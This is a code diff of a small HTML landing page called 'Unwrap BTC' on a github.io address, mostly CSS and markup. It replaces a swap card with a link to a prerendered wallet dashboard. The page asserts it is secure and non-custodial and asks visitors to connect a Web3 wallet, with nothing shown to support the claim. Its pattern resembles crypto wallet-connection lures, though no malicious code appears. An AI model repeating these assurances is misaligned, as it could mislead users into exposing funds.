@@ -3,118 +3,419 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Unwrap BTC</title>
-  <meta name="description" content="Unwrap BTC converts Wrapped Bitcoin back into native BTC in a few quick steps.">
+  <title>Unwrap BTC - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for Unwrap BTC DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://unwrap-btc.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F4EF">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Unwrap BTC">
-  <meta property="og:description" content="Unwrap BTC converts Wrapped Bitcoin back into native BTC in a few quick steps.">
-  <meta property="og:url" content="https://unwrap-btc.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Unwrap BTC">
-  <meta name="twitter:description" content="Unwrap BTC converts Wrapped Bitcoin back into native BTC in a few quick steps.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://unwrap-btc.github.io/#website",
-        "url": "https://unwrap-btc.github.io/",
-        "name": "Unwrap BTC",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://unwrap-btc.github.io/#app",
-        "name": "Unwrap BTC",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://unwrap-btc.github.io/"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://unwrap-btc.github.io/#organization",
-        "name": "Unwrap BTC",
-        "url": "https://unwrap-btc.github.io/",
-        "logo": "https://unwrap-btc.github.io/favicon.png"
-      }
-    ]
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root {
+  --bg: #F7F4EF;
+  --bg-soft: #FBFAF7;
+  --surface: #FFFFFF;
+  --surface-muted: #F2F0EA;
+  --ink: #151719;
+  --text: #30343A;
+  --muted: #73777D;
+  --faint: #A2A5AA;
+  --line: rgba(21, 23, 25, .10);
+  --line-strong: rgba(21, 23, 25, .16);
+  --accent: #2E6FF2;
+  --accent-hover: #245DD4;
+  --accent-soft: rgba(46, 111, 242, .10);
+  --shadow: 0 24px 70px -36px rgba(21, 23, 25, .38);
+  --max: 1080px;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  min-height: 100%;
+}
+
+body {
+  min-height: 100dvh;
+  margin: 0;
+  overflow-x: hidden;
+  color: var(--ink);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.5;
+  background:
+    radial-gradient(640px 340px at 50% -120px, rgba(46, 111, 242, .13), transparent 70%),
+    linear-gradient(180deg, var(--bg-soft), var(--bg));
+  -webkit-font-smoothing: antialiased;
+  display: flex;
+  flex-direction: column;
+}
+
+a {
+  color: inherit;
+  text-decoration: none;
+}
+
+img {
+  display: block;
+  max-width: 100%;
+}
+
+h1,
+p {
+  margin: 0;
+}
+
+.topbar {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  padding: 18px clamp(18px, 4vw, 42px) 10px;
+}
+
+.brand {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  min-width: 0;
+  color: var(--ink);
+  font-size: 1.05rem;
+  font-weight: 750;
+  letter-spacing: 0;
+  white-space: nowrap;
+}
+
+.brand img {
+  width: 30px;
+  height: 30px;
+  border-radius: 9px;
+  box-shadow: 0 0 0 1px var(--line);
+}
+
+.nav {
+  display: flex;
+  align-items: center;
+  gap: 26px;
+  margin-left: 12px;
+}
+
+.nav a {
+  color: var(--muted);
+  font-size: .94rem;
+  font-weight: 550;
+  white-space: nowrap;
+  transition: color .16s ease;
+}
+
+.nav a:hover {
+  color: var(--ink);
+}
+
+.spacer {
+  flex: 1;
+}
+
+.ghost {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 40px;
+  padding: 0 17px;
+  border: 1px solid var(--line-strong);
+  border-radius: 999px;
+  background: rgba(255, 255, 255, .66);
+  color: var(--text);
+  font-size: .92rem;
+  font-weight: 700;
+  box-shadow: 0 10px 28px -24px rgba(21, 23, 25, .35);
+  transition: border-color .16s ease, color .16s ease, transform .16s ease, background .16s ease;
+}
+
+.ghost:hover {
+  color: var(--accent);
+  border-color: rgba(46, 111, 242, .34);
+  background: var(--surface);
+  transform: translateY(-1px);
+}
+
+.stage {
+  flex: 1;
+  width: min(var(--max), 100%);
+  margin: 0 auto;
+  padding: clamp(14px, 4vh, 34px) clamp(18px, 4vw, 42px) 10px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+}
+
+.hero {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+h1 {
+  font-size: clamp(3rem, 7.4vw, 5rem);
+  line-height: 1;
+  font-weight: 820;
+  letter-spacing: 0;
+}
+
+.value {
+  max-width: 51ch;
+  margin-top: 15px;
+  color: var(--muted);
+  font-size: clamp(1rem, 1.7vw, 1.18rem);
+}
+
+.value strong {
+  color: var(--ink);
+  font-weight: 760;
+  box-shadow: inset 0 -.45em 0 var(--accent-soft);
+}
+
+.app-card {
+  width: min(580px, 100%);
+  margin-top: 34px;
+  padding: 20px;
+  border: 1px solid var(--line);
+  border-radius: 20px;
+  background: var(--surface);
+  box-shadow: var(--shadow);
+}
+
+.route {
+  display: flex;
+  align-items: stretch;
+  gap: 12px;
+}
+
+.leg {
+  flex: 1 1 0;
+  min-width: 0;
+  padding: 14px 16px 15px;
+  text-align: left;
+  border: 1px solid var(--line);
+  border-radius: 14px;
+  background: var(--surface-muted);
+}
+
+.label {
+  display: block;
+  color: var(--faint);
+  font-size: .72rem;
+  font-weight: 780;
+  letter-spacing: .08em;
+  line-height: 1;
+  text-transform: uppercase;
+}
+
+.chip {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  min-height: 32px;
+  margin-top: 10px;
+  color: var(--ink);
+  font-size: 1.08rem;
+  font-weight: 820;
+}
+
+.chip img {
+  width: 28px;
+  height: 28px;
+  flex: 0 0 auto;
+  border-radius: 50%;
+}
+
+.switch {
+  align-self: center;
+  width: 42px;
+  height: 42px;
+  flex: 0 0 42px;
+  border: 1px solid var(--line-strong);
+  border-radius: 50%;
+  background: var(--surface);
+  color: var(--muted);
+  cursor: pointer;
+  display: grid;
+  place-items: center;
+  box-shadow: 0 10px 28px -24px rgba(21, 23, 25, .46);
+  transition: color .16s ease, border-color .16s ease, background .16s ease, transform .16s ease;
+}
+
+.switch span {
+  font-size: 1.08rem;
+  line-height: 1;
+}
+
+.switch:hover {
+  color: var(--accent);
+  border-color: rgba(46, 111, 242, .32);
+  background: var(--accent-soft);
+  transform: translateY(-1px);
+}
+
+.primary {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  min-height: 55px;
+  margin-top: 16px;
+  border-radius: 14px;
+  background: var(--accent);
+  color: #FFFFFF;
+  font-size: 1.06rem;
+  font-weight: 820;
+  box-shadow: 0 18px 42px -28px rgba(46, 111, 242, .70);
+  transition: background .16s ease, transform .16s ease, box-shadow .16s ease;
+}
+
+.primary:hover {
+  background: var(--accent-hover);
+  box-shadow: 0 20px 46px -26px rgba(46, 111, 242, .74);
+  transform: translateY(-1px);
+}
+
+.primary span {
+  margin-left: 8px;
+  font-size: 1.2em;
+  line-height: 1;
+}
+
+.footer {
+  padding: 12px 24px 24px;
+  color: var(--faint);
+  text-align: center;
+  font-size: .86rem;
+  font-weight: 560;
+}
+
+@media (max-width: 700px) {
+  .topbar {
+    gap: 12px;
+    padding-top: 15px;
   }
-  </script>
+
+  .nav {
+    display: none;
+  }
+
+  .brand {
+    font-size: .98rem;
+  }
+
+  .ghost {
+    min-height: 38px;
+    padding: 0 14px;
+    font-size: .88rem;
+  }
+
+  .stage {
+    padding-top: 8px;
+  }
+
+  h1 {
+    font-size: clamp(2.54rem, 14vw, 3.35rem);
+  }
+
+  .value {
+    max-width: 31ch;
+    margin-top: 12px;
+    font-size: .99rem;
+  }
+
+  .app-card {
+    margin-top: 25px;
+    padding: 16px;
+    border-radius: 18px;
+  }
+
+  .route {
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .leg {
+    padding: 13px 14px;
+  }
+
+  .switch {
+    width: 40px;
+    height: 40px;
+    flex-basis: 40px;
+    margin: -1px 0;
+  }
+
+  .switch span {
+    transform: rotate(90deg);
+  }
+
+  .primary {
+    min-height: 52px;
+    margin-top: 14px;
+  }
+
+  .footer {
+    padding-bottom: 18px;
+  }
+}
+
+@media (max-height: 720px) {
+  .topbar {
+    padding-top: 12px;
+  }
+
+  .stage {
+    padding-top: 6px;
+  }
+
+  .app-card {
+    margin-top: 22px;
+  }
+
+  .footer {
+    padding-bottom: 14px;
+  }
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Unwrap BTC home">
-      <img src="simpleswap.png" width="30" height="30" alt="">
+    <div class="brand">
+      <img src="favicon.png" width="30" height="30" alt="">
       <span>Unwrap BTC</span>
-    </a>
-
-    <nav class="nav" aria-label="Authority references">
-      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
-      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
-      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </div>
+    <span class="spacer"></span>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
     </nav>
-
-    <span class="spacer" aria-hidden="true"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-label="Unwrap BTC">
-      <h1>Unwrap BTC</h1>
-      <p class="value"><strong>Unwrap BTC</strong> converts Wrapped Bitcoin back into native BTC in a few quick steps.</p>
-    </section>
-
-    <section class="app-card" aria-label="Exchange route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img src="btc.png" width="28" height="28" alt="WBTC">
-            <span>WBTC</span>
-          </span>
-        </div>
-
-        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img src="btc.png" width="28" height="28" alt="BTC">
-            <span>BTC</span>
-          </span>
-        </div>
-      </div>
-
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">Unwrap BTC</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
   <footer class="footer">Unwrap BTC &mdash; 2026</footer>
-
-  <script>
-  (function () {
-    "use strict";
-    var button = document.querySelector("[data-switch]");
-    if (!button) return;
-
-    button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
-    });
-  }());
-  </script>
 </body>
 </html>
